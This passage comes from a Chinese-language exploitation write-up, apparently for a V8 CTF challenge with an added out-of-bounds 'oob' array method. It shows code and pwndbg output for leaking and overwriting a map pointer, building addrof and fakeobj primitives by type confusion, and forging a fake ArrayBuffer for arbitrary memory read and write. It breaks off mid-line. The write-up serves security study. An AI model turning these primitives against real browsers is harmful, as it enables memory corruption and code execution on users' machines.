class="number">1.1</span>)<span class="number">0x00003d28495c2ed9</span>(map*)</span><br><span class="line"><span class="number">0x39deae34e610</span>:<span class="number">0x000009dc5a3c0c71</span><span class="number">0x000039deae34e5f1</span></span><br><span class="line"><span class="number">0x39deae34e620</span>:<span class="number">0x0000000100000000</span><span class="number">0x000009dc5a3c0561</span></span><br><span class="line"><span class="number">0x39deae34e630</span>:<span class="number">0x00003d28495c2ed9</span><span class="number">0x000009dc5a3c12c9</span></span><br><span class="line"><span class="number">0x39deae34e640</span>:<span class="number">0x0000000100000000</span><span class="number">0x0000040000000000</span></span><br><span class="line"><span class="number">0x39deae34e650</span>:<span class="number">0x00003d28495c2d99</span><span class="number">0x000009dc5a3c0c71</span></span><br><span class="line"><span class="number">0x39deae34e660</span>:<span class="number">0x000039deae34e671</span><span class="number">0x0000000200000000</span></span><br><span class="line"><span class="number">0x39deae34e670</span>:<span class="number">0x000009dc5a3c0801</span><span class="number">0x0000000400000000</span></span><br><span class="line"><span class="number">0x39deae34e680</span>:<span class="number">0x495c2ed900000000</span><span class="number">0x00003d2800000000</span></span><br></pre></td></tr></table></figure></div><blockquote><p>可以发现oob返回的是map*，同时在内存布局中，也是elements元素1.1的后一个</p></blockquote><p>再试试越界写，oob需要传参</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(double_arr);</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(double_arr.<span class="title function_">oob</span>(<span class="number">1</span>)))); </span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x1f2d236ce609</span> &lt;<span class="title class_">JSArray</span>[<span class="number">1</span>]&gt;</span><br><span class="line"><span class="number">0x7ff8000000000000</span></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x1f2d236ce609</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x1f2d236ce608</span>:<span class="number">0x3ff0000000000000</span>(double值的<span class="number">1</span>)<span class="number">0x00001e25c1480c71</span></span><br><span class="line"><span class="number">0x1f2d236ce618</span>:<span class="number">0x00001f2d236ce5f1</span><span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x1f2d236ce628</span>:<span class="number">0x00001e25c14812c9</span><span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x1f2d236ce638</span>:<span class="number">0x0000040000000000</span><span class="number">0x0000321e94f82d99</span></span><br><span class="line"><span class="number">0x1f2d236ce648</span>:<span class="number">0x00001e25c1480c71</span><span class="number">0x00001f2d236ce661</span></span><br><span class="line"><span class="number">0x1f2d236ce658</span>:<span class="number">0x0000000200000000</span><span class="number">0x00001e25c1480801</span></span><br><span class="line"><span class="number">0x1f2d236ce668</span>:<span class="number">0x0000000400000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x1f2d236ce678</span>:<span class="number">0x7ff8000000000000</span><span class="number">0x00001e25c14805b1</span></span><br><span class="line"><span class="number">0x1f2d236ce688</span>:<span class="number">0x00001e25c14805b1</span><span class="number">0x0000321e94f83ab9</span></span><br><span class="line"><span class="number">0x1f2d236ce698</span>:<span class="number">0x00001e25c1480c71</span><span class="number">0x00001e25c1480c71</span></span><br></pre></td></tr></table></figure></div><blockquote><p>直接把map*改成了1，也就是说给oob传的参数会向后覆盖一个元素，刚好对应这个<code>map*</code></p><p>🤔这里就有个利用点，可以构造一个double array，然后用oob把它的<code>map*</code> leak出来，后面再构造一个object array，利用oob传参越界写的特性，把object array的<code>map*</code>覆盖成前面leak的double array的<code>map*</code>,实现一个object array –&gt; double array的类型混淆</p></blockquote><h3 id="原语构造"><a href="#原语构造" class="headerlink" title="原语构造"></a>原语构造</h3><p>leak任意object的address</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj_param</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">    double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr[<span class="number">0</span>] = obj_param;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(double_arr.<span class="title function_">oob</span>());<span class="comment">//替换map*</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(obj_arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>其实就是利用上面说的trick，把要leak地址的object先存到object array中，然后把object array混淆成double array，这样后面读取elements的时候就会以double array的方式直接返回(这样就是返回address)，就不会按原来object array的方式(指针解引用然后…)</p></blockquote><p>也可以反过来伪造任意对象，传入任意地址，存到double array中，把double array混淆成object array，这样再访问刚刚传入的地址，就会被当作HeapObject Pointer来解析</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">    double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    double_arr[<span class="number">0</span>] = addr;</span><br><span class="line">    double_arr.<span class="title function_">oob</span>(obj_arr.<span class="title function_">oob</span>());<span class="comment">//替换map*</span></span><br><span class="line">    <span class="keyword">return</span> double_arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>之后还需要伪造object对应的内存布局，因此需要了解map*结构</p></blockquote><p>回顾一下map的结构，第二个int值比较重要，代表了type</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// +----+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Int           | The second int field                        |</span></span><br><span class="line"><span class="comment">//  `---+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Short    | [instance_type]                             |🌟🌟🌟</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [bit_field]                                 |</span></span><br><span class="line"><span class="comment">//      |          |   - has_non_instance_prototype (bit 0)      |</span></span><br><span class="line"><span class="comment">//      |          |   - is_callable (bit 1)                     |</span></span><br><span class="line"><span class="comment">//      |          |   - has_named_interceptor (bit 2)           |</span></span><br><span class="line"><span class="comment">//      |          |   - has_indexed_interceptor (bit 3)         |</span></span><br><span class="line"><span class="comment">//      |          |   - is_undetectable (bit 4)                 |</span></span><br><span class="line"><span class="comment">//      |          |   - is_access_check_needed (bit 5)          |</span></span><br><span class="line"><span class="comment">//      |          |   - is_constructor (bit 6)                  |</span></span><br><span class="line"><span class="comment">//      |          |   - has_prototype_slot (bit 7)              |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [bit_field2]                                |</span></span><br><span class="line"><span class="comment">//      |          |   - is_extensible (bit 0)                   |</span></span><br><span class="line"><span class="comment">//      |          |   - is_prototype_map (bit 1)                |</span></span><br><span class="line"><span class="comment">//      |          |   - is_in_retained_map_list (bit 2)         |</span></span><br><span class="line"><span class="comment">//      |          |   - elements_kind (bits 3..7)               |</span></span><br><span class="line"><span class="comment">// +----+----------+---------------------------------------------+</span></span><br></pre></td></tr></table></figure></div><blockquote><p>可以伪造一个map，然后改<code>instance_type</code>，这样就能伪造任意类型的object了</p></blockquote><h3 id="伪造object例子🌰"><a href="#伪造object例子🌰" class="headerlink" title="伪造object例子🌰"></a>伪造object例子🌰</h3><p>之前提到ArrayBuffer可以通过改backing store的大小来实现任意地址读写，因此这里可以尝试伪造一个ArrayBuffer,伪造的话肯定需要map*，这里先看一个正常的ArrayBuffer</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(ab);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x28f3b7c4e899</span> &lt;<span class="title class_">ArrayBuffer</span> map = <span class="number">0xda8501c21b9</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x28f3b7c4e899</span></span><br><span class="line"><span class="number">0x28f3b7c4e899</span>: [<span class="title class_">JSArrayBuffer</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x0da8501c21b9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x20729294e981</span> &lt;<span class="title class_">Object</span> map = <span class="number">0xda8501c2209</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x37f811f00c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - embedder <span class="attr">fields</span>: <span class="number">2</span></span><br><span class="line"> - <span class="attr">backing_store</span>: <span class="number">0x55879d7411e0</span></span><br><span class="line"> - <span class="attr">byte_length</span>: <span class="number">32</span></span><br><span class="line"> - detachable</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x37f811f00c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    <span class="number">0</span>, aligned <span class="attr">pointer</span>: (nil)</span><br><span class="line">    <span class="number">0</span>, aligned <span class="attr">pointer</span>: (nil)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x28f3b7c4e899</span>-<span class="number">1</span> <span class="comment">//看看ArrayBuffer</span></span><br><span class="line"><span class="number">0x28f3b7c4e898</span>:<span class="number">0x00000da8501c21b9</span>(map*)<span class="number">0x000037f811f00c71</span>(properties)</span><br><span class="line"><span class="number">0x28f3b7c4e8a8</span>:<span class="number">0x000037f811f00c71</span>(elements)<span class="number">0x0000000000000020</span>(byte_length)</span><br><span class="line"><span class="number">0x28f3b7c4e8b8</span>:<span class="number">0x000055879d7411e0</span>(<span class="title class_">BackingStore</span>)<span class="number">0x0000000000000002</span>(embedder fields)</span><br><span class="line"><span class="number">0x28f3b7c4e8c8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e8d8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e8e8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e8f8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e908</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e918</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e928</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x0da8501c21b9</span> </span><br><span class="line"><span class="number">0xda8501c21b9</span>: [<span class="title class_">Map</span>]</span><br><span class="line"> - <span class="attr">type</span>: <span class="variable constant_">JS_ARRAY_BUFFER_TYPE</span></span><br><span class="line"> - instance <span class="attr">size</span>: <span class="number">64</span></span><br><span class="line"> - inobject <span class="attr">properties</span>: <span class="number">0</span></span><br><span class="line"> - elements <span class="attr">kind</span>: <span class="variable constant_">HOLEY_ELEMENTS</span></span><br><span class="line"> - unused property <span class="attr">fields</span>: <span class="number">0</span></span><br><span class="line"> - enum <span class="attr">length</span>: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back <span class="attr">pointer</span>: <span class="number">0x37f811f004d1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line"> - prototype_validity <span class="attr">cell</span>: <span class="number">0x2aff905c0609</span> &lt;<span class="title class_">Cell</span> value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance <span class="title function_">descriptors</span> (own) #<span class="number">0</span>: <span class="number">0x37f811f00259</span> &lt;<span class="title class_">DescriptorArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - layout <span class="attr">descriptor</span>: (nil)</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x20729294e981</span> &lt;<span class="title class_">Object</span> map = <span class="number">0xda8501c2209</span>&gt;</span><br><span class="line"> - <span class="attr">constructor</span>: <span class="number">0x20729294e7e9</span> &lt;<span class="title class_">JSFunction</span> <span class="title class_">ArrayBuffer</span> (sfi = <span class="number">0x2aff905ccff9</span>)&gt;</span><br><span class="line"> - dependent <span class="attr">code</span>: <span class="number">0x37f811f002c1</span> &lt;<span class="title class_">Other</span> heap <span class="title function_">object</span> (<span class="variable constant_">WEAK_FIXED_ARRAY_TYPE</span>)&gt;</span><br><span class="line"> - construction <span class="attr">counter</span>: <span class="number">0</span></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x0da8501c21b9</span>-<span class="number">1</span> <span class="comment">//看看map</span></span><br><span class="line"><span class="number">0xda8501c21b8</span>:<span class="number">0x000037f811f00189</span>(一个指向根<span class="title class_">Map</span>的<span class="title class_">Poniter</span>)<span class="number">0x1900042319080808</span>(包含第一个和第二个int)</span><br><span class="line"><span class="number">0xda8501c21c8</span>:<span class="number">0x00000000082003ff</span><span class="number">0x000020729294e981</span></span><br><span class="line"><span class="number">0xda8501c21d8</span>:<span class="number">0x000020729294e7e9</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xda8501c21e8</span>:<span class="number">0x000037f811f00259</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xda8501c21f8</span>:<span class="number">0x000037f811f002c1</span><span class="number">0x00002aff905c0609</span></span><br><span class="line"><span class="number">0xda8501c2208</span>:<span class="number">0x000037f811f00189</span><span class="number">0x1b0004211d060307</span></span><br><span class="line"><span class="number">0xda8501c2218</span>:<span class="number">0x00000000182013ff</span><span class="number">0x0000207292942091</span></span><br><span class="line"><span class="number">0xda8501c2228</span>:<span class="number">0x00002072929420c9</span><span class="number">0x000020729294e9b9</span></span><br><span class="line"><span class="number">0xda8501c2238</span>:<span class="number">0x000020729294e9f1</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xda8501c2248</span>:<span class="number">0x000037f811f002c1</span><span class="number">0x00002aff905c0609</span></span><br></pre></td></tr></table></figure></div><p>之前说过map结构里第二个int值表示type，因此可以直接把<code>0x1900042319080808</code> copy过来，就可以伪造一个ArrayBuffer的map了，其余结构参考上面job的结果</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array_buffer_obj = [</span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//map*, properties （properties只要不去访问，设置成0也没事）</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x4000</span>), <span class="comment">//elements, length</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">2</span>), <span class="comment">//backing_store, embedder fields</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//padding, padding</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x1900042319080808</span>), <span class="comment">//fake map</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure></div><blockquote><p><code>u2d</code>是前面写的工具function，unsigned int-&gt;double</p><p>这里可以看到<code>map*</code>的位置写的是0，这个是因为我们还不知道我们构造的fake map的具体地址，现在需要把fake map的address leak出来，然后填到<code>map*</code>的位置</p></blockquote><p>那么怎么leak这个fake map的address呢🤔，由于前面构造原语的章节说过，可以利用类型混淆来leak出任意object的address，因此我们可以在运行poc的时候leak出构造的<code>fake_array_buffer_obj</code>的地址，之后只要加上构造的<code>fake map</code>相对于<code>fake_array_buffer_obj</code>的偏移就可以了。</p><p>那么怎么获得这个偏移🤔其实我们构造的<code>fake_array_buffer_obj</code>实质上是一个JSArray，回顾一下之前说的JSArray的结构，后面存储的元素其实是在FixedArray的Elements中，而Elements相对于JSArray头的偏移其实是**<u>固定</u>**的</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[&quot;Pointer (63 bit) | 1&quot;] --&gt; B[JSArray]</span><br><span class="line">    B --&gt; C[Map*]</span><br><span class="line">    B --&gt; D[Properties*]</span><br><span class="line">    B --&gt; E[Elements*]</span><br><span class="line">    B --&gt; F[Length]</span><br><span class="line">    E --&gt; G[FixedArray]</span><br><span class="line">    G --&gt; H[Map*]</span><br><span class="line">    G --&gt; I[Length]</span><br><span class="line">    G --&gt; J[&quot;Elements[0]&quot;]</span><br><span class="line">    G --&gt; K[&quot;Elements[1]&quot;]</span><br><span class="line">    G --&gt; M[&quot;....&quot;]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="计算fake-map偏移"><a href="#计算fake-map偏移" class="headerlink" title="计算fake map偏移"></a>计算fake map偏移</h3><p>首先看一下构造的fakeobj</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array_buffer_obj = [</span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//map*, properties （properties只要不去访问，设置成0也没事）</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x4000</span>), <span class="comment">//elements, length</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">2</span>), <span class="comment">//backing_store, embedder fields</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//padding, padding</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x1900042319080808</span>), <span class="comment">//fake map</span></span><br><span class="line">];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(fake_array_buffer_obj);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x033dc42cad71</span> &lt;<span class="title class_">JSArray</span>[<span class="number">10</span>]&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x033dc42cad71</span> <span class="comment">//看看JSArray</span></span><br><span class="line"><span class="number">0x33dc42cad71</span>: [<span class="title class_">JSArray</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x357201fc2ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x34e472dd1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x033dc42cada9</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">10</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">10</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x2c40d2940c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x1aa9ac5c01a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x033dc42cada9</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">10</span>]&gt; &#123;</span><br><span class="line">         <span class="number">0</span>-<span class="number">2</span>: <span class="number">0</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">8.09477e-320</span></span><br><span class="line">           <span class="number">4</span>: <span class="number">0</span></span><br><span class="line">           <span class="number">5</span>: <span class="number">9.88131e-324</span></span><br><span class="line">         <span class="number">6</span>-<span class="number">8</span>: <span class="number">0</span></span><br><span class="line">           <span class="number">9</span>: <span class="number">2.87575e-188</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x033dc42cada9</span>-<span class="number">1</span> <span class="comment">//看看elements</span></span><br><span class="line"><span class="number">0x33dc42cada8</span>:<span class="number">0x00002c40d29414f9</span>(map*)<span class="number">0x0000000a00000000</span>(length)</span><br><span class="line"><span class="number">0x33dc42cadb8</span>:<span class="number">0x0000000000000000</span>(<span class="title class_">Elements</span>[<span class="number">0</span>])<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33dc42cadc8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000004000</span></span><br><span class="line"><span class="number">0x33dc42cadd8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000002</span></span><br><span class="line"><span class="number">0x33dc42cade8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33dc42cadf8</span>:<span class="number">0x0000000000000000</span><span class="number">0x1900042319080800</span>(fake map🌟)</span><br><span class="line"><span class="number">0x33dc42cae08</span>:<span class="number">0x00002c40d2940139</span><span class="number">0x000351f800000000</span></span><br><span class="line"><span class="number">0x33dc42cae18</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33dc42cae28</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33dc42cae38</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x33dc42cadb8</span>-<span class="number">0x33dc42cad70</span></span><br><span class="line">$2 = <span class="number">0x48</span></span><br></pre></td></tr></table></figure></div><blockquote><p>可以看到Elements相对于JSArray头的偏移是0x48，所以再加上fake map相对于Elements的偏移(4x16&#x3D;64)就得到了fake map相对于JSArray的偏移\</p></blockquote><p>这样就可以构造一个ArrayBuffer了</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array_buffer_obj = [</span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//map*, properties （properties只要不去访问，设置成0也没事）</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x4000</span>), <span class="comment">//elements, length</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">2</span>), <span class="comment">//backing_store, embedder fields</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//padding, padding</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x1900042319080808</span>), <span class="comment">//fake map 这步很关键，如果没改对map。后续利用fakeobj返回的object类型就不会是ArrayBuffer</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> fake_obj_elements_addr = <span class="title function_">addrof</span>(fake_array_buffer_obj) + <span class="number">0x48</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake obj elements addr is:&quot;</span>+<span class="title function_">hex</span>(fake_obj_elements_addr));</span><br><span class="line"><span class="keyword">let</span> array_buffer_obj_map_addr = fake_obj_elements_addr + <span class="number">64</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake array buffer&#x27;s map addr is:&quot;</span>+<span class="title function_">hex</span>( array_buffer_obj_map_addr));</span><br><span class="line">fake_array_buffer_obj[<span class="number">0</span>]=<span class="title function_">u2d</span>(array_buffer_obj_map_addr);<span class="comment">//fake map的地址替换</span></span><br><span class="line"><span class="keyword">let</span> fake_array_buffer = <span class="title 